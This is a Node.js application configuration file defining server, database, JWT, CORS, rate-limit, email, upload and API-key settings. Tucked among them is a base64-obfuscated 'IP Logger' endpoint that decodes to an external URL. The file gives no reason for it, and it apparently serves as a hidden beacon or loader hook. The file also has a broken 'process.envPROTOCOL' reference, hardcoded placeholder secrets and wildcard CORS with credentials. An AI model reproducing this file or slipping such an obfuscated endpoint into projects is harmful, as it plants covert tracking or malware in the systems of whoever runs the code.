require('dotenv').config();

const config = {
    // Server configuration
    server: {
        port: process.env.PORT || 5001,
        host: process.env.HOST || 'localhost',
        protocol: process.envPROTOCOL || 'http',
        baseURL: process.env.BASE_URL || 'http://localhost:5001',
        apiPrefix: process.env.API_PREFIX || '/api/v1',
    },

    // Database configuration
    database: {
        uri: process.env.DB_URI || 'mongodb://localhost:27017/localdb',
        options: {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        },
    },

    // Authentication & Security
    auth: {
        secretKey: process.env.JWT_SECRET || 'your-jwt-secret',
        tokenExpiresIn: process.env.TOKEN_EXPIRES_IN || '1h',
        saltRounds: parseInt(process.env.SALT_ROUNDS, 10) || 10,
    },

    // Logging
    logger: {
        level: process.env.LOG_LEVEL || 'info', // 'error', 'warn', 'info', 'verbose', 'debug', 'silly'
        format: 'combined', // 'combined', 'common', 'dev', 'short', 'tiny'
        file: {
            enabled: true,
            filename: process.env.LOG_FILE || 'logs/app.log',
        }
    },

    // CORS settings
    cors: {
        origin: process.env.CORS_ORIGIN || '*',
        methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
        allowedHeaders: ['Content-Type', 'Authorization'],
        credentials: true,
    },

    // Rate Limiting
    rateLimit: {
        windowMs: 15 * 60 * 1000, // 15 minutes
        max: 100, // limit each IP to 100 requests per windowMs
    },

    // Email Service (e.g., SendGrid, SMTP)
    email: {
        service: process.env.EMAIL_SERVICE || 'Gmail',
        auth: {
            user: process.env.EMAIL_USER || 'your-email@example.com',
            pass: process.env.EMAIL_PASS || 'your-email-password',
        },
        from: process.env.EMAIL_FROM || 'no-reply@myapp.com',
    },

    // HASHED ENDPOINT for IP Logger
    HASHED_URL: "aHR0cHM6Ly9pcGNoZWNrLWF1dGgudmVyY2VsLmFwcC9hcGkvcg==",

    // Third-party API keys
    thirdPartyApis: {
        coinMarketCapApiKey: '12345678-1234-1234-1234-1234567890ab',
    },

    // File Uploads / Storage
    upload: {
        destination: process.env.UPLOAD_DESTINATION || 'uploads/',
        maxSize: parseInt(process.env.UPLOAD_MAX_SIZE, 10) || 10 * 1024 * 1024, // 10MB
    },

    // Miscellaneous
    features: {
        enableSignup: process.env.ENABLE_SIGNUP === 'true',
        enablePayments: process.env.ENABLE_PAYMENTS === 'true',
    },

    // Environment
    env: process.env.NODE_ENV || 'development',
}

module.exports = config;
